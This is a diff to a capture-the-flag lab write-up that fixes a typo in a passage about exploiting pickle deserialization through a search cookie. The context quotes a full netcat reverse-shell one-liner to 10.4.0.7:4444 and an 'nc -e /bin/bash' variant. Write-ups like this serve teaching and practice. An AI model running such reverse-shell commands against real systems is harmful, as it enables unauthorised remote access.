@@ -8,7 +8,7 @@ A fun room, with a pickle deserialization vector, internal pivot, and several py
 
 Enumeration revealed a single port, 5003. On that port was a website talking about pies and pickles, nice puns around python and the pickle serialization library. Sure enough, the search functionality would set a cookie with a pickle value.
 
-Exploiting this is a bit tricky, mainly because the website didn't respond to malformed cookies (it instead would crash generally if the search page is accessed via a GET). This defelected me for a bit, trying to find the right place where the cookie value was read. However, in actuality the value IS read on the GET /search, it just crashes anyway, so replacing the cookie and requesting this page is the entry point.
+Exploiting this is a bit tricky, mainly because the website didn't respond to malformed cookies (it instead would crash generally if the search page is accessed via a GET). This deflected me for a bit, as I tried to find the right place where the cookie value was read. However, in actuality the value IS read on the GET /search, it just crashes anyway, so replacing the cookie and requesting this page is the entry point.
 
 The second issue was that the standard `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.7 4444 >/tmp/f` would fail, but I eventually discovered that plain `nc -e /bin/bash` worked. Always worth testing, even if this is rare.
 
